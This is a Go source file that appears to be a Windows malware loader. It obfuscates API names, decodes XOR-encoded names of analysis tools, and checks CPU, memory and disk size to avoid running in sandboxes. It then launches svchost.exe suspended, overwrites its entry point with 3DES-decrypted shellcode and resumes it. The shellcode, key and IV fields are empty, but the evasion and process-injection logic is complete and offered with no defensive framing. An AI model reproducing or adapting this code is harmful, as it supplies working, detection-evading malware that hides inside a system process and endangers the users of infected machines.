package percino

import (
	"encoding/binary"
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"unsafe"
)

func IsProcessRunning(processName string) bool {
	hSnap, _, _ := syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'C', 'r', 'e', 'a', 't', 'e', 'T', 'o', 'o', 'l', 'h', 'e', 'l', 'p', '3', '2', 'S', 'n', 'a', 'p', 's', 'h', 'o', 't',
	})).Call(uintptr(TH32CS_SNAPPROCESS), 0)
	if hSnap == uintptr(INVALID_HANDLE_VALUE) {
		return false
	}
	defer syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e',
	})).Call(hSnap)

	var pe32 PROCESSENTRY32
	pe32.dwSize = uint32(unsafe.Sizeof(pe32))
	ret, _, _ := syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'P', 'r', 'o', 'c', 'e', 's', 's', '3', '2', 'F', 'i', 'r', 's', 't', 'W',
	})).Call(hSnap, uintptr(unsafe.Pointer(&pe32)))

	for ret != 0 {
		if strings.EqualFold(processName, syscall.UTF16ToString(pe32.szExeFile[:])) {
			return true
		}
		ret, _, _ = syscall.MustLoadDLL(string([]byte{
			'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
		})).MustFindProc(string([]byte{
			'P', 'r', 'o', 'c', 'e', 's', 's', '3', '2', 'N', 'e', 'x', 't', 'W',
		})).Call(hSnap, uintptr(unsafe.Pointer(&pe32)))
	}

	return false
}

func CheckSandbox() bool {
	// change these to xor'd strings, runtime decoded
	processes := []string{
		"0327094d270f221b2e1929",
		"3c390a57261e367d2a022709394b513b08",
		"182815422a08321b2e1929",
		"0d3e115b31182b4665043409",
		"0d3e115b31182b46284f29142e",
		"0a2209512e022b1b2e1929",
		"1c390a572e022b1b2e1929",
		"1e2e02592c036b503304",
		"1c390a572615351b2e1929",
		"052f04456d083d50",
		"052f044575596b503304",
		"252608412d04314c0f042e192c02513143204d2e",
		"3b22175130052447204f29142e",
		"083e0844200c351b2e1929",
		"24240a5f061535592413291e65004c26",
		"2526155b31191770084f29142e",
		"3c0e315b2c01361b2e1929",
		"2024175013286b503304",
		"3f32167d2d1e35502815231e65004c26",
		"1c390a571c0c2b5427183609394b513b08",
		"1f3216752d0c294c31043e422e1d51",
		"1f250c5225322d5c3f4f29142e",
		"1b220b50210a6b503304",
		"062400562c15265a25153e03274b513b08",
		"062400562c1536503917291e65004c26",
		"3e2e165b361f265003002f072e171a261520",
		"14785750210a6b503304",
		"147d5150210a6b503304",
		"2a2201502f08371b2e1929",
		"043f1144270827402c06291e65004c26",
		"1f3913442c1e311b2e1929",
	}

	processSandbox := false
	for _, process := range processes {
		clearTextProcess, err := DeXORHex(process, "lKe4CmE5KaL")
		fmt.Println(clearTextProcess)
		if IsProcessRunning(clearTextProcess) {
			processSandbox = true
			break
		}
	}

	cpuSandbox := runtime.NumCPU() <= 2
	msx := &memStatusEx{
		dwLength: 64,
	}
	r1, _, _ := syscall.NewLazyDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).NewProc(string([]byte{
		'G', 'l', 'o', 'b', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 'S', 't', 'a', 't', 'u', 's', 'E', 'x',
	})).Call(uintptr(unsafe.Pointer(msx)))
	memorySandbox := r1 == 0 || msx.ullTotalPhys < 4174967296
	lpTotalNumberOfBytes := int64(0)
	diskret, _, _ := syscall.NewLazyDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).NewProc(string([]byte{
		'G', 'e', 't', 'D', 'i', 's', 'k', 'F', 'r', 'e', 'e', 'S', 'p', 'a', 'c', 'e', 'E', 'x', 'W',
	})).Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("C:\\"))),
		uintptr(0),
		uintptr(unsafe.Pointer(&lpTotalNumberOfBytes)),
		uintptr(0),
	)
	diskSandbox := diskret == 0 || lpTotalNumberOfBytes < 60719476736

	return cpuSandbox || memorySandbox || diskSandbox || processSandbox
}

func main() {

	if CheckSandbox() {
		return
	}
	zzzh()
	epath := []byte{
		'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 's', 'v', 'c', 'h', 'o', 's', 't', '.', 'e', 'x', 'e',
	}
	path := string(epath)

	sch := []byte("")
	key := []byte("")
	iv := []byte("")

	startupInfo := &syscall.StartupInfo{}
	processInfo := &syscall.ProcessInformation{}
	pathArray := append([]byte(path), byte(0))
	syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A',
	})).Call(0, uintptr(unsafe.Pointer(&pathArray[0])), 0, 0, 0, 0x4, 0, 0, uintptr(unsafe.Pointer(startupInfo)), uintptr(unsafe.Pointer(processInfo)))

	pointerSize := unsafe.Sizeof(uintptr(0))
	basicInfo := &PROCESS_BASIC_INFORMATION{}
	tmp := 0
	syscall.MustLoadDLL(string([]byte{
		'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'Z', 'w', 'Q', 'u', 'e', 'r', 'y', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's',
	})).Call(uintptr(processInfo.Process), 0, uintptr(unsafe.Pointer(basicInfo)), pointerSize*6, uintptr(unsafe.Pointer(&tmp)))

	imageBaseAddress := basicInfo.PebAddress + 0x10
	addressBuffer := make([]byte, pointerSize)
	read := 0
	syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'R', 'e', 'a', 'd', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y',
	})).Call(uintptr(processInfo.Process), imageBaseAddress, uintptr(unsafe.Pointer(&addressBuffer[0])), uintptr(len(addressBuffer)), uintptr(unsafe.Pointer(&read)))

	imageBaseValue := binary.LittleEndian.Uint64(addressBuffer)
	addressBuffer = make([]byte, 0x200)
	syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'R', 'e', 'a', 'd', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y',
	})).Call(uintptr(processInfo.Process), uintptr(imageBaseValue), uintptr(unsafe.Pointer(&addressBuffer[0])), uintptr(len(addressBuffer)), uintptr(unsafe.Pointer(&read)))

	lfaNewPos := addressBuffer[0x3c : 0x3c+0x4]
	lfanew := binary.LittleEndian.Uint32(lfaNewPos)
	entrypointOffset := lfanew + 0x28
	entrypointOffsetPos := addressBuffer[entrypointOffset : entrypointOffset+0x4]
	entrypointRVA := binary.LittleEndian.Uint32(entrypointOffsetPos)
	entrypointAddress := imageBaseValue + uint64(entrypointRVA)
	zzzh()
	decryptedsch := decryptDES3(sch, key, iv)
	syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y',
	})).Call(uintptr(processInfo.Process), uintptr(entrypointAddress), uintptr(unsafe.Pointer(&decryptedsch[0])), uintptr(len(decryptedsch)), 0)

	syscall.MustLoadDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
	})).MustFindProc(string([]byte{
		'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd',
	})).Call(uintptr(processInfo.Thread))
}
